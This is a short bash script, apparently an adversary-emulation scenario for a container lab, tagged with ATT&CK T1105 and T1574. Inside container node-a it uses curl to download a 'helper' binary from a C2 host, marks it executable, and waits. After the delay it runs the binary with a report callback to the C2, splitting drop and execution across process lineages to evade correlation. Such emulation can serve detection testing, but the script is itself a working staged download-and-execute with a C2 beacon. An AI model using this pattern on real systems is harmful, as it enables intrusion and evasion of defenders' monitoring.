#!/usr/bin/env bash
# S3 apt-staged-drop（容器拓扑版）：落盘与执行分属不同 lineage、错峰。
# ATT&CK: T1105 落盘 + T1574 后续加载执行。
set -euo pipefail
C2="${C2:-10.66.0.99}"
GAP="${GAP:-120}"

docker exec node-a bash -c "
  curl -s http://$C2:8080/helper -o /var/lib/app/plugins/helper
  chmod +x /var/lib/app/plugins/helper
"

sleep "$GAP"

docker exec node-a bash -c "
  /var/lib/app/plugins/helper --report http://$C2:443
"
echo "[apt-staged-drop] two-stage cross-lineage attack executed (container)"
